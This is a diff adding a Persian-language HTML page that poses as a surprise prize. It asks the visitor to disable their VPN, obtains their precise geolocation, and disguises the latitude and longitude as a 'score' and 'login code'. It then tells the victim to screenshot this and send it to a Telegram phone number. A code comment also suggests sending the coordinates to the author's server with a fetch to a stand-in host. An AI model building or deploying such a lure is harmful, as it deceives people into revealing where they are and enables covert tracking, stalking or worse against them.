@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>🎁 جایزه ویژه برای تو!</title>
+  <meta charset="UTF-8">
+  <style>
+    body {
+      font-family: sans-serif;
+      background: linear-gradient(135deg, #00c6ff, #0072ff);
+      color: white;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      text-align: center;
+    }
+    .box {
+      background: rgba(255, 255, 255, 0.1);
+      padding: 30px;
+      border-radius: 16px;
+      backdrop-filter: blur(10px);
+    }
+    button {
+      padding: 12px 20px;
+      border: none;
+      border-radius: 8px;
+      background: white;
+      color: #0072ff;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <h2>🥳 یه سوپرایز مخصوص تو دارم!</h2>
+    <p>فقط بدون فیلتر شکن روی دکمه زیر بزن تا باز شه...</p>
+    <button onclick="getLocation()">باز کردن سوپرایز 🎁</button>
+    <p id="status"></p>
+  </div>
+
+  <script>
+    function getLocation() {
+      if (navigator.geolocation) {
+        document.getElementById('status').innerText = "منتظر بمانید عزیزم و پیام های روی صفحه رو قبول کنید";
+        navigator.geolocation.getCurrentPosition(showPosition, showError);
+      } else {
+        document.getElementById('status').innerText = "مشکل از مرور گر شما";
+      }
+    }
+
+    function showPosition(position) {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+      document.getElementById('status').innerHTML = `
+        🗺️ شما در مسابقه آراس ثبت نام شدید<br>
+        امتیاز شما: ${lat}<br>
+        کد ورود شما: ${lon}<br><br>
+        <p>از این اسکرین شات بگیر و به این شماره در تلگرام ارسال کن و منتظر جواب باش: 0938 794 5385..</p>
+      `;
+
+      // اگر بخوای مختصات برن برای شما، اینجا fetch بزن به تلگرام یا سرویس خودت
+      // یا مثلاً:
+      // fetch("https://your-server.com/save?lat=" + lat + "&lon=" + lon)
+    }
+
+    function showError(error) {
+      switch (error.code) {
+        case error.PERMISSION_DENIED:
+          document.getElementById('status').innerText = "اجازه   داده نشد.";
+          break;
+        case error.POSITION_UNAVAILABLE:
+          document.getElementById('status').innerText = "مرورگر رو عوض کنید در دسترس نیست.";
+          break;
+        case error.TIMEOUT:
+          document.getElementById('status').innerText = "درخواست زمان برد.";
+          break;
+        default:
+          document.getElementById('status').innerText = "خطای ناشناخته.";
+          break;
+      }
+    }
+  </script>
+</body>
+</html>
